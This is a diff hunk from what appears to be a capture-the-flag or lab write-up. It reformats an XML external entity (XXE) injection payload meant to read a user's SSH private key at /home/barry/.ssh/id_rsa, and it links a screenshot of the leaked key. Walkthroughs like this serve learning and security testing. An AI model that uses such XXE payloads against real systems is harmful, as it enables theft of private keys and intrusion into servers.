@@ -95,11 +95,11 @@ Progress: 220557 / 220558 (100.00%)
 </br> example: /home/barry/.ssh/id_rsa
 </br> note that .ssh is HIDDEN so you need `ls -la` to see it
 </br> applying that we put more commands into the xml injection to read the rsa key
-```
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE author [<!ENTITY read SYSTEM 'ls -la /home/barry/.ssh/id_rsa'>]>
-<root><author>&read;</author></root>
-``
+
+`<?xml version="1.0" encoding="UTF-8"?>`
+`<!DOCTYPE author [<!ENTITY read SYSTEM 'ls -la /home/barry/.ssh/id_rsa'>]>`
+`<root><author>&read;</author></root>`
+
 </br> ![rsakeyleak3](https://github.com/user-attachments/assets/3ff8f3a5-d805-440c-ad6a-1352347ef739)
 
 
